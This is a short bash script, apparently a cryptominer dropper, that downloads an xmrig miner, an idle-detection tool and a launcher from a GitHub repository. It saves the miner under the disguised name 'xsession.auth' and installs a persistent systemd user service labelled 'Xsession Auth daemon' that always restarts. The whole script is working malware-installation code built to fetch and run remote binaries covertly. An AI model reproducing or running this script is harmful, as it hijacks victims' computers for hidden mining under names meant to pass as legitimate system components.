#!/bin/bash

REPO_URL=https://github.com/freebyte/xmrdropper
XMRIG_URL=$REPO_URL/raw/master/xmrig
XPRINTIDLE_URL=$REPO_URL/raw/master/xprintidle
APP_URL=$REPO_URL/raw/master/Xsession.sh
LOCAL_PATH=$HOME/.local/bin
APPNAME=Xsession.sh
XMRIGNAME=xsession.auth
XPRINTIDLE_NAME=xprintidle
SYSTEMD_PATH=$HOME/.config/systemd/user


curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL 


chmod +x $LOCAL_PATH/$APPNAME
chmod +x $LOCAL_PATH/$XMRIGNAME
chmod +x $LOCAL_PATH/$XPRINTIDLE_NAME

mkdir -p $SYSTEMD_PATH
cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
[Unit] 
Description=Xsession Auth daemon

[Service]
ExecStart=$LOCAL_PATH/$APPNAME
Restart=always

[Install]
WantedBy=default.target

HEREDOC

systemctl --user daemon-reload
systemctl --user enable $APPNAME.service
systemctl --user restart $APPNAME.service
